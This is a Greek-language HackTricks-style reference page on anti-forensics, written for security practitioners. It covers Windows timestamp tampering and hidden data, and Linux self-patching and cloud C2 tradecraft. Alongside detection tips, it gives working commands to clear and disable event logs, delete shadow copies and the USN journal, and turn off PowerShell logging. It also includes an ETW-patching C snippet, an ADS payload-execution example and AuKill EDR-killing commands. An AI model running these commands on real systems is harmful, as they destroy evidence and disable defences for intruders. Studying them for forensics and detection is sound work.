# Τεχνικές Anti-Forensic

{{#include ../../banners/hacktricks-training.md}}

## Χρονικές σημάνσεις

Ένας επιτιθέμενος μπορεί να ενδιαφέρεται να **αλλάξει τις χρονικές σημάνσεις αρχείων** ώστε να αποφύγει τον εντοπισμό.\
Οι χρονικές σημάνσεις βρίσκονται στο MFT, στα attributes `$STANDARD_INFORMATION` \_\_ και \_\_ `$FILE_NAME`.

Και τα δύο attributes έχουν 4 χρονικές σημάνσεις: **Τροποποίηση**, **πρόσβαση**, **δημιουργία** και **τροποποίηση εγγραφής MFT** (MACE ή MACB).

Ο **Windows explorer** και άλλα εργαλεία εμφανίζουν τις πληροφορίες από το **`$STANDARD_INFORMATION`**.

### TimeStomp - Εργαλείο Anti-forensic

Αυτό το εργαλείο **τροποποιεί** τις πληροφορίες χρονικών σημάνσεων μέσα στο **`$STANDARD_INFORMATION`**, **αλλά** **όχι** τις πληροφορίες μέσα στο **`$FILE_NAME`**. Επομένως, είναι δυνατό να **εντοπιστεί** **ύποπτη** **δραστηριότητα**.

### Usnjrnl

Το **USN Journal** (Update Sequence Number Journal) είναι μια λειτουργία του NTFS (Windows NT file system) που παρακολουθεί τις αλλαγές στον τόμο. Το εργαλείο [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) επιτρέπει την εξέταση αυτών των αλλαγών.

![TimeStomp - Εργαλείο Anti-forensic - Usnjrnl: Το USN Journal (Update Sequence Number Journal) είναι μια λειτουργία του NTFS (Windows NT file system) που παρακολουθεί τις αλλαγές στον τόμο. Το...](<../../images/image (801).png>)

Η προηγούμενη εικόνα δείχνει το **αποτέλεσμα** του **εργαλείου**, όπου φαίνεται ότι **πραγματοποιήθηκαν κάποιες αλλαγές** στο αρχείο.

### $LogFile

**Όλες οι αλλαγές μεταδεδομένων σε ένα σύστημα αρχείων καταγράφονται** σε μια διαδικασία γνωστή ως [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Τα καταγεγραμμένα μεταδεδομένα αποθηκεύονται σε ένα αρχείο με όνομα `**$LogFile**`, το οποίο βρίσκεται στον ριζικό κατάλογο ενός συστήματος αρχείων NTFS. Εργαλεία όπως το [LogFileParser](https://github.com/jschicht/LogFileParser) μπορούν να χρησιμοποιηθούν για την ανάλυση αυτού του αρχείου και τον εντοπισμό αλλαγών.

![Usnjrnl - $LogFile: Όλες οι αλλαγές μεταδεδομένων σε ένα σύστημα αρχείων καταγράφονται σε μια διαδικασία γνωστή ως write-ahead logging. Τα καταγεγραμμένα μεταδεδομένα αποθηκεύονται σε ένα αρχείο με όνομα $LogFile , το οποίο βρίσκεται στον ριζικό...](<../../images/image (137).png>)

Και πάλι, στο αποτέλεσμα του εργαλείου φαίνεται ότι **πραγματοποιήθηκαν κάποιες αλλαγές**.

Με το ίδιο εργαλείο είναι δυνατό να προσδιοριστεί **πότε τροποποιήθηκαν οι χρονικές σημάνσεις**:

![Usnjrnl - $LogFile: Με το ίδιο εργαλείο είναι δυνατό να προσδιοριστεί πότε τροποποιήθηκαν οι χρονικές σημάνσεις](<../../images/image (1089).png>)

- CTIME: Χρόνος δημιουργίας του αρχείου
- ATIME: Χρόνος τροποποίησης του αρχείου
- MTIME: Τροποποίηση εγγραφής MFT του αρχείου
- RTIME: Χρόνος πρόσβασης του αρχείου

### Σύγκριση `$STANDARD_INFORMATION` και `$FILE_NAME`

Ένας άλλος τρόπος εντοπισμού ύποπτων τροποποιημένων αρχείων είναι η σύγκριση των χρονικών σημάνσεων και στα δύο attributes, αναζητώντας **ασυμφωνίες**.

### Νανοδευτερόλεπτα

Οι χρονικές σημάνσεις **NTFS** έχουν **ακρίβεια** **100 νανοδευτερολέπτων**. Επομένως, είναι πολύ ύποπτο να εντοπιστούν αρχεία με χρονικές σημάνσεις όπως 2010-10-10 10:10:**00.000:0000**.

### SetMace - Εργαλείο Anti-forensic

Αυτό το εργαλείο μπορεί να τροποποιήσει και τα δύο attributes, `$STARNDAR_INFORMATION` και `$FILE_NAME`. Ωστόσο, από τα Windows Vista και μετά, απαιτείται ενεργό OS για την τροποποίηση αυτών των πληροφοριών.

## Απόκρυψη δεδομένων

Το NFTS χρησιμοποιεί cluster και το ελάχιστο μέγεθος πληροφοριών. Αυτό σημαίνει ότι αν ένα αρχείο καταλαμβάνει ενάμιση cluster, το **υπόλοιπο μισό δεν πρόκειται να χρησιμοποιηθεί** μέχρι να διαγραφεί το αρχείο. Έτσι, είναι δυνατό να **αποκρυφτούν δεδομένα σε αυτόν τον slack space**.

Υπάρχουν εργαλεία όπως το slacker που επιτρέπουν την απόκρυψη δεδομένων σε αυτόν τον «κρυφό» χώρο. Ωστόσο, η ανάλυση των `$logfile` και `$usnjrnl` μπορεί να δείξει ότι προστέθηκαν δεδομένα:

![SetMace - Εργαλείο Anti-forensic - Απόκρυψη δεδομένων: Υπάρχουν εργαλεία όπως το slacker που επιτρέπουν την απόκρυψη δεδομένων σε αυτόν τον «κρυφό» χώρο. Ωστόσο, η ανάλυση των $logfile και $usnjrnl μπορεί να δείξει ότι...](<../../images/image (1060).png>)

Έπειτα, είναι δυνατό να ανακτηθεί ο slack space με εργαλεία όπως το FTK Imager. Σημειώστε ότι αυτού του είδους τα εργαλεία μπορούν να αποθηκεύσουν το περιεχόμενο συγκαλυμμένο ή ακόμα και κρυπτογραφημένο.

## UsbKill

Αυτό είναι ένα εργαλείο που **απενεργοποιεί τον υπολογιστή αν εντοπιστεί οποιαδήποτε αλλαγή στις θύρες USB**.\
Ένας τρόπος να εντοπιστεί είναι να επιθεωρηθούν οι διεργασίες που εκτελούνται και να **ελεγχθεί κάθε εκτελούμενο script Python**.

## Διανομές Live Linux

Αυτές οι διανομές **εκτελούνται μέσα στη μνήμη RAM**. Ο μόνος τρόπος εντοπισμού τους είναι **αν το σύστημα αρχείων NTFS έχει προσαρτηθεί με δικαιώματα εγγραφής**. Αν έχει προσαρτηθεί μόνο με δικαιώματα ανάγνωσης, δεν θα είναι δυνατό να εντοπιστεί η εισβολή.

## Ασφαλής διαγραφή

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Καθυστερημένη αυτοδιαγραφή στα Windows

Μια εικόνα των Windows που εκτελείται μπορεί να είναι κλειδωμένη όσο η διεργασία της παραμένει ενεργή. Μια διεργασία μπορεί να αναθέσει τη διαγραφή σε μια θυγατρική `cmd.exe`, να χρησιμοποιήσει το `choice` ως χρονόμετρο και να τερματιστεί προτού το shell εκτελέσει το `del`. Η καθυστέρηση επιτρέπει στην αρχική διεργασία να αποδεσμεύσει το handle της εικόνας της· απαιτούνται εισαγωγικά γύρω από την πλήρη διαδρομή αν περιέχει κενά.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Όταν αυτή η συμβολοσειρά δίνεται απευθείας ως όρισμα στο `cmd.exe`, αντί να πληκτρολογείται από άλλη διαδραστική προτροπή `cmd`, χρησιμοποιήστε `&` αντί για `^&` και `>nul` αντί για `^>nul`. Αυτό αφαιρεί την εγγραφή καταλόγου· **δεν αποτελεί ασφαλή διαγραφή** και δεν αφαιρεί ίχνη εκτέλεσης, εργασιών, ημερολογίου συστήματος αρχείων ή άλλα εγκληματολογικά ίχνη. Αναζητήστε βραχύβιες διεργασίες-παιδιά `cmd.exe` των οποίων η γραμμή εντολών συνδυάζει τα `choice /T`, `Del` και τη διαδρομή της εικόνας του γονέα.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Ρύθμιση παραμέτρων των Windows

Είναι δυνατό να απενεργοποιηθούν αρκετές μέθοδοι καταγραφής των Windows, ώστε να γίνει πολύ δυσκολότερη η εγκληματολογική διερεύνηση.

### Απενεργοποίηση χρονικών σημάνσεων - UserAssist

Αυτό είναι ένα κλειδί μητρώου που διατηρεί τις ημερομηνίες και τις ώρες εκτέλεσης κάθε εκτελέσιμου αρχείου από τον χρήστη.

Η απενεργοποίηση του UserAssist απαιτεί δύο βήματα:

1. Ορίστε σε μηδέν δύο κλειδιά μητρώου, τα `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` και `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, ώστε να δηλωθεί ότι θέλουμε απενεργοποιημένο το UserAssist.
2. Καθαρίστε τα δέντρα του μητρώου σας που έχουν μορφή `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Απενεργοποίηση χρονικών σημάνσεων - Prefetch

Αυτό αποθηκεύει πληροφορίες για τις εφαρμογές που εκτελούνται, με σκοπό τη βελτίωση της απόδοσης του συστήματος Windows. Ωστόσο, μπορεί να είναι χρήσιμο και για εγκληματολογικές εξετάσεις.

- Εκτελέστε το `regedit`
- Επιλέξτε τη διαδρομή αρχείου `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Κάντε δεξί κλικ στα `EnablePrefetcher` και `EnableSuperfetch`
- Επιλέξτε Modify σε καθένα από αυτά, για να αλλάξετε την τιμή από 1 (ή 3) σε 0
- Κάντε επανεκκίνηση

### Απενεργοποίηση χρονικών σημάνσεων - Last Access Time

Κάθε φορά που ανοίγεται ένας φάκελος από τόμο NTFS σε διακομιστή Windows NT, το σύστημα ενημερώνει **ένα πεδίο χρονικής σήμανσης σε κάθε καταχωρισμένο φάκελο**, το οποίο ονομάζεται χρόνος τελευταίας πρόσβασης. Σε έναν τόμο NTFS με μεγάλη χρήση, αυτό μπορεί να επηρεάσει την απόδοση.

1. Ανοίξτε τον Επεξεργαστή Μητρώου (Regedit.exe).
2. Μεταβείτε στο `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Αναζητήστε το `NtfsDisableLastAccessUpdate`. Αν δεν υπάρχει, προσθέστε αυτό το DWORD και ορίστε την τιμή του σε 1, ώστε να απενεργοποιηθεί η διαδικασία.
4. Κλείστε τον Επεξεργαστή Μητρώου και επανεκκινήστε τον διακομιστή.

### Διαγραφή ιστορικού USB

Όλες οι **εγγραφές συσκευών USB** αποθηκεύονται στο Μητρώο των Windows, κάτω από το κλειδί μητρώου **USBSTOR**, το οποίο περιέχει δευτερεύοντα κλειδιά που δημιουργούνται κάθε φορά που συνδέετε μια συσκευή USB στον υπολογιστή ή τον φορητό υπολογιστή σας. Μπορείτε να βρείτε αυτό το κλειδί εδώ: H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Αν το διαγράψετε**, θα διαγράψετε το ιστορικό USB.\
Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), για να βεβαιωθείτε ότι τα έχετε διαγράψει (και για να τα διαγράψετε).

Ένα άλλο αρχείο που αποθηκεύει πληροφορίες σχετικά με τις συσκευές USB είναι το `setupapi.dev.log`, μέσα στον φάκελο `C:\Windows\INF`. Θα πρέπει να διαγραφεί και αυτό.

### Απενεργοποίηση Shadow Copies

**Εμφανίστε** τις shadow copies με `vssadmin list shadowstorage`\
**Διαγράψτε** τις εκτελώντας `vssadmin delete shadow`

Μπορείτε επίσης να τις διαγράψετε μέσω GUI, ακολουθώντας τα βήματα που προτείνονται στο [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Για να απενεργοποιήσετε τις shadow copies [ακολουθήστε τα βήματα από εδώ](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Ανοίξτε την εφαρμογή Services πληκτρολογώντας "services" στο πλαίσιο αναζήτησης κειμένου, αφού κάνετε κλικ στο κουμπί έναρξης των Windows.
2. Από τη λίστα, βρείτε το "Volume Shadow Copy", επιλέξτε το και, στη συνέχεια, ανοίξτε τις Properties κάνοντας δεξί κλικ.
3. Επιλέξτε Disabled από το αναπτυσσόμενο μενού "Startup type" και, στη συνέχεια, επιβεβαιώστε την αλλαγή κάνοντας κλικ στα Apply και OK.

Είναι επίσης δυνατό να τροποποιήσετε στο μητρώο τη ρύθμιση των αρχείων που θα αντιγράφονται στη shadow copy, στη διαδρομή `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Αντικατάσταση των διαγραμμένων αρχείων

- Μπορείτε να χρησιμοποιήσετε ένα **εργαλείο των Windows**: `cipher /w:C`. Αυτό υποδεικνύει στο cipher να αφαιρέσει τυχόν δεδομένα από τον διαθέσιμο, αχρησιμοποίητο χώρο δίσκου στη μονάδα C.
- Μπορείτε επίσης να χρησιμοποιήσετε εργαλεία όπως το [**Eraser**](https://eraser.heidi.ie)

### Διαγραφή αρχείων καταγραφής συμβάντων των Windows

- Windows + R --> eventvwr.msc --> Αναπτύξτε το "Windows Logs" --> Κάντε δεξί κλικ σε κάθε κατηγορία και επιλέξτε "Clear Log"
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Απενεργοποίηση αρχείων καταγραφής συμβάντων των Windows

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Στην ενότητα services, απενεργοποιήστε την υπηρεσία "Windows Event Log"
- `WEvtUtil.exec clear-log` ή `WEvtUtil.exe cl`

### Απενεργοποίηση του $UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## Προηγμένη καταγραφή και παραποίηση ιχνών (2023-2025)

### Καταγραφή PowerShell ScriptBlock/Module

Οι πρόσφατες εκδόσεις των Windows 10/11 και του Windows Server διατηρούν **πλούσια εγκληματολογικά τεκμήρια του PowerShell** στο
`Microsoft-Windows-PowerShell/Operational` (συμβάντα 4104/4105/4106).  
Οι εισβολείς μπορούν να τα απενεργοποιήσουν ή να τα διαγράψουν κατά τη διάρκεια της εκτέλεσης:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Οι defenders θα πρέπει να παρακολουθούν τις αλλαγές σε αυτά τα registry keys και τη μαζική διαγραφή συμβάντων PowerShell.

### ETW (Event Tracing for Windows) Patch

Τα προϊόντα endpoint security βασίζονται σε μεγάλο βαθμό στο ETW. Μια δημοφιλής μέθοδος evasion το 2024 είναι η επιδιόρθωση των `ntdll!EtwEventWrite`/`EtwEventWriteFull` στη μνήμη, ώστε κάθε κλήση ETW να επιστρέφει `STATUS_SUCCESS` χωρίς να εκπέμπει το συμβάν:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Public PoCs (π.χ. `EtwTiSwallow`) υλοποιούν το ίδιο primitive σε PowerShell ή C++.  
Επειδή το patch είναι **τοπικό στη διεργασία**, τα EDR που εκτελούνται μέσα σε άλλες διεργασίες ενδέχεται να μην το εντοπίσουν.<sup>[[5]](#references)</sup>
Ανίχνευση: συγκρίνετε το `ntdll` στη μνήμη με το αντίγραφό του στον δίσκο ή κάντε hook πριν από το user-mode.

### Αναβίωση των Alternate Data Streams (ADS)

Έχουν παρατηρηθεί καμπάνιες malware το 2023 (π.χ. loaders του **FIN12**) να τοποθετούν binaries δεύτερου σταδίου μέσα σε ADS, ώστε να παραμένουν αόρατα στους παραδοσιακούς σαρωτές:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Απαριθμήστε τις ροές με `dir /R`, `Get-Item -Stream *` ή το Sysinternals `streams64.exe`.
Η αντιγραφή του αρχείου-ξενιστή σε FAT/exFAT ή μέσω SMB αφαιρεί την κρυφή ροή και μπορεί να χρησιμοποιηθεί
από τους ερευνητές για την ανάκτηση του payload.

### BYOVD & «AuKill» (2023)

Η χρήση ευάλωτου driver που παρέχεται από τον ίδιο τον εισβολέα χρησιμοποιείται πλέον συστηματικά για **anti-forensics** σε
εισβολές ransomware.  
Το εργαλείο ανοικτού κώδικα **AuKill** φορτώνει έναν υπογεγραμμένο αλλά ευάλωτο driver (`procexp152.sys`) για να
αναστείλει ή να τερματίσει αισθητήρες EDR και εγκληματολογικής ανάλυσης **πριν από την κρυπτογράφηση και την καταστροφή των logs**:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Το driver αφαιρείται στη συνέχεια, αφήνοντας ελάχιστα artifacts.<sup>[[1]](#references)</sup>  
Μετριασμός: ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων driver της Microsoft (HVCI/SAC) και δημιουργήστε ειδοποίηση για δημιουργία kernel-service από διαδρομές εγγράψιμες από χρήστες.

---

## Linux Anti-Forensics: Self-Patching και Cloud C2 (2023–2025)

### Self‑patching υπηρεσιών μετά την παραβίασή τους για μείωση του εντοπισμού (Linux)
Οι επιτιθέμενοι εφαρμόζουν ολοένα και συχνότερα «self-patch» σε μια υπηρεσία αμέσως μετά την εκμετάλλευσή της, ώστε τόσο να αποτρέψουν την εκ νέου εκμετάλλευσή της όσο και να καταστείλουν τους εντοπισμούς που βασίζονται σε ευπάθειες. Η ιδέα είναι να αντικαταστήσουν τα ευάλωτα στοιχεία με τις πιο πρόσφατες νόμιμες upstream εκδόσεις των binaries/JARs, ώστε οι σαρωτές να αναφέρουν ότι ο host έχει ενημερωθεί, ενώ η persistence και το C2 παραμένουν.<sup>[[3]](#references)</sup>

Παράδειγμα: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Μετά το post‑exploitation, οι επιτιθέμενοι κατέβασαν νόμιμα JARs από το Maven Central (repo1.maven.org), διέγραψαν τα ευάλωτα JARs από την εγκατάσταση του ActiveMQ και επανεκκίνησαν τον broker.
- Έτσι έκλεισαν το αρχικό RCE, διατηρώντας παράλληλα άλλα σημεία πρόσβασης (cron, αλλαγές στη διαμόρφωση SSH, ξεχωριστά C2 implants).

Λειτουργικό παράδειγμα (ενδεικτικό)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Συμβουλές forensics/hunting
- Ελέγξτε τους καταλόγους υπηρεσιών για μη προγραμματισμένες αντικαταστάσεις binary/JAR:
  - Debian/Ubuntu: `dpkg -V activemq` και συγκρίνετε τα hashes/paths των αρχείων με τα repo mirrors.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Αναζητήστε εκδόσεις JAR που υπάρχουν στον δίσκο αλλά δεν ανήκουν στον package manager ή συμβολικούς συνδέσμους που ενημερώθηκαν εκτός της συνήθους διαδικασίας.
- Χρονολόγιο: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` για να συσχετίσετε τα ctime/mtime με το χρονικό διάστημα της παραβίασης.
- Ιστορικό shell/τηλεμετρία διεργασιών: ενδείξεις χρήσης `curl`/`wget` προς το `repo1.maven.org` ή άλλα artifact CDN αμέσως μετά την αρχική εκμετάλλευση.
- Διαχείριση αλλαγών: επικυρώστε ποιος εφάρμοσε το “patch” και γιατί, όχι μόνο ότι υπάρχει εγκατεστημένη patched έκδοση.

### C2 μέσω cloud υπηρεσιών με bearer tokens και anti-analysis stagers
Η παρατηρημένη τακτική συνδύαζε πολλαπλές διαδρομές C2 μεγάλης διάρκειας και συσκευασία anti-analysis:<sup>[[3]](#references)</sup>
- ELF loaders PyInstaller προστατευμένα με κωδικό πρόσβασης, ώστε να δυσχεραίνουν το sandboxing και τη στατική ανάλυση (π.χ. κρυπτογραφημένο PYZ, προσωρινή εξαγωγή στον κατάλογο `/_MEI*`).
  - Ενδείξεις: ευρήματα από `strings`, όπως `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Artifacts κατά το runtime: εξαγωγή στο `/tmp/_MEI*` ή σε προσαρμοσμένες διαδρομές `--runtime-tmpdir`.
- C2 μέσω Dropbox με hardcoded OAuth Bearer tokens
  - Δείκτες δικτύου: `api.dropboxapi.com` / `content.dropboxapi.com` με `Authorization: Bearer <token>`.
  - Αναζητήστε σε proxy/NetFlow/Zeek/Suricata εξερχόμενη κίνηση HTTPS προς domains του Dropbox από workloads διακομιστών που κανονικά δεν συγχρονίζουν αρχεία.
- Παράλληλο/εφεδρικό C2 μέσω tunneling (π.χ. Cloudflare Tunnel `cloudflared`), για διατήρηση του ελέγχου αν μπλοκαριστεί ένα κανάλι.
  - Host IOCs: διεργασίες/μονάδες `cloudflared`, config στο `~/.cloudflared/*.json`, εξερχόμενη κίνηση στη θύρα 443 προς Cloudflare edges.

### Persistence και “hardening rollback” για διατήρηση της πρόσβασης (παραδείγματα Linux)
Οι επιτιθέμενοι συχνά συνδυάζουν το self-patching με ανθεκτικούς τρόπους διατήρησης της πρόσβασης:<sup>[[3]](#references)</sup>
- Cron/Anacron: τροποποιήσεις στο stub `0anacron` σε κάθε κατάλογο `/etc/cron.*/` για περιοδική εκτέλεση.
  - Αναζητήστε:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Αναίρεση της ενίσχυσης της διαμόρφωσης SSH: ενεργοποίηση συνδέσεων root και αλλαγή των προεπιλεγμένων shells για λογαριασμούς με χαμηλά προνόμια.
  - Αναζητήστε την ενεργοποίηση συνδέσεων root:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Αναζητήστε ύποπτα διαδραστικά shells σε λογαριασμούς συστήματος (π.χ., `games`):
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Τυχαία beacon τεχνουργήματα με σύντομα ονόματα (8 αλφαβητικοί χαρακτήρες), που αφήνονται στον δίσκο και επικοινωνούν επίσης με cloud C2:
  - Hunt:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Οι αμυνόμενοι θα πρέπει να συσχετίζουν αυτά τα τεχνουργήματα με την εξωτερική έκθεση και τα συμβάντα εγκατάστασης ενημερώσεων κώδικα στις υπηρεσίες, ώστε να εντοπίζουν αυτοεπιδιόρθωση anti-forensic χαρακτήρα που χρησιμοποιείται για την απόκρυψη της αρχικής εκμετάλλευσης.

## Εκτέλεση ενσωματωμένου στατικού shell

Ένα script wrapper με ενσωματωμένο interpreter και υλοποιήσεις εντολών μπορεί να εκτελεί υποστηριζόμενες λειτουργίες shell μέσα σε ένα εκτελέσιμο αρχείο, αντί να εκκινεί το `/bin/sh` και ξεχωριστές διεργασίες βοηθητικών προγραμμάτων. Το HimitsuShell δημιουργεί ένα τέτοιο στατικό binary musl. Σε αντίθεση με τα [SHc wrappers](../../linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.md), οι ενσωματωμένες εντολές του δεν χρειάζεται να εκκινήσουν το shell του συστήματος ή μια ξεχωριστή διεργασία βοηθητικού προγράμματος. Οι μη υποστηριζόμενες εντολές μπορούν να εκτελεστούν μέσω του shell του συστήματος.<sup>[[9]](#references)</sup>

Αυτό μειώνει την ορατότητα των διεργασιών shell και των θυγατρικών κλήσεων `execve`.<sup>[[9]](#references)</sup> Η διεργασία wrapper και οι κλήσεις συστήματός της εξακολουθούν να είναι ορατές μέσω kernel tracepoints, επομένως ο ισχυρισμός του έργου ότι είναι αόρατη ακόμη και στην ανίχνευση του kernel δεν θα πρέπει να εκλαμβάνεται κυριολεκτικά.<sup>[[9]](#references)[[11]](#references)</sup>

Για την τεκμηριωμένη έκδοση x86_64, διατηρήστε το όνομα εισόδου `launcher.sh` και αντιγράψτε το στο container πριν από τη μεταγλώττιση. Το αρχείο εξόδου είναι το `safeLauncher`:<sup>[[9]](#references)</sup>

```bash
curl -LO https://github.com/HimitsuShell/Himitsu/releases/download/v2.1.0/himitsu_core_x86_64_linux_musl.tar.gz
docker load -i himitsu_core_x86_64_linux_musl.tar.gz
docker run --name himitsu_core -d -it himitsu_core
docker cp launcher.sh himitsu_core:/var/work/
docker exec himitsu_core /var/work/compile.sh
docker cp himitsu_core:/var/work/safeLauncher .
```

Το δημόσιο `compile.sh` κρυπτογραφεί το script με AES-256-CTR, κρυπτογραφεί την τιμή λήξης και τα ενδιάμεσα κλειδιά/IV με AES-256-CBC, μετατρέπει τα κρυπτογραφημένα αρχεία σε πίνακες C με `xxd -i` και τα συνδέει με το `lib.bc` χρησιμοποιώντας `-static -s`. Το τελικό κλειδί κρυπτογράφησης και το IV ενσωματώνονται επίσης, επομένως πρόκειται για προστασία από περιστασιακή στατική εξαγωγή και όχι για μυστικό που δεν μπορεί ποτέ να ανακτηθεί.<sup>[[10]](#references)</sup>

Τα προεπιλεγμένα περάσματα LLVM είναι τα `-sobf` και `-sub`. Πριν από το build, επεξεργαστείτε το `/var/work/compile.sh` για να ενεργοποιήσετε τεκμηριωμένες εναλλακτικές, όπως το control-flow flattening (`fla`) ή το bogus control flow (`bcf`).<sup>[[9]](#references)[[10]](#references)</sup>

Δοκιμάστε τη συμβατότητα των script προτού βασιστείτε σε αυτό το wrapper: το project στοχεύει σε σύνταξη POSIX shell, προειδοποιεί ότι τα script Bash/Zsh ενδέχεται να αποτύχουν και αναφέρει ότι οι εντολές εκτός του ενσωματωμένου συνόλου του εκτελούνται από το system shell.<sup>[[9]](#references)</sup>

Για ανάλυση του flattened control flow, δείτε [παράκαμψη του flattened control flow με ένα στενό execution slice](../../reversing/reversing-tools-basic-methods/#bypass-flattened-control-flow-with-a-narrow-execution-slice).

{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Sophos X-Ops – AuKill: Ένας οπλισμένος ευάλωτος driver για την απενεργοποίηση του EDR (Μάρτιος 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Επιδιόρθωση του EtwEventWrite για stealth: Ανίχνευση και hunting (Ιούνιος 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching για persistence: Πώς το Linux malware DripDropper κινείται στο cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – RCE μέσω Apache ActiveMQ OpenWire (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Απόκρυψη του .NET σας - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Αποκάλυψη παραλλαγής του SectopRAT ενσωματωμένης σε νόμιμο λογισμικό](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – εντολή choice](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – εντολή del](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
- [9] [README του HimitsuShell](https://github.com/HimitsuShell/HimitsuShell)
- [10] [Script build του HimitsuShell](https://github.com/HimitsuShell/HimitsuShell/blob/main/inside_container/compile.sh)
- [11] [Ιστογράμματα συμβάντων του πυρήνα Linux και tracing syscall](https://docs.kernel.org/trace/histogram.html)
